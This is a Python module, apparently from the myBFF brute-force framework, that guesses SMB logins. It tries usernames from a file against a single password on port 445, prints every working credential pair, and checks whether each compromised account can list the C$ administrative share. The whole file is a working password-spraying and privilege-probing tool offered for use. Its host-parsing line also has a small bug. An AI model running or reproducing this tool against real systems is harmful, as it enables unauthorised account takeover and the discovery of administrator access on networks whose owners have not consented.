#! /usr/bin/python
# Part of myBFF, SMB guessing
import smb
from smb.base import SharedDevice
from smb.SMBConnection import SMBConnection

class SMB():
    def somethingCool(self, config, userID, password, server_name, conn, connection):
            try:
                shareList = conn.listPath('C$', '//')
                print("[!]        User is an Administrator!")
            except:
                print "[-]        User is not an Administrator"



    def connectTest(self, config, userID, password, server_name):
        conn = SMBConnection(userID, password, 'pycon', server_name, use_ntlm_v2=True, domain=config["domain"], sign_options=SMBConnection.SIGN_WHEN_SUPPORTED, is_direct_tcp=True)
        connection = conn.connect(server_name, 445)
        if connection:
            print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
            self.somethingCool(config, userID, password, server_name, conn, connection)
        else:
            print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
    def payload(self, config):
        server_name = str(config["HOST"]).strip('smb://')
        if config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                    config["USERNAME"] = line.strip('\n')
                    userID = config["USERNAME"]
                    password = config["PASSWORD"]
                    self.connectTest(config, userID, password, server_name)
        else:
            userID = config["USERNAME"]
            password = config["PASSWORD"]
            self.connectTest(config, userID, password, server_name)
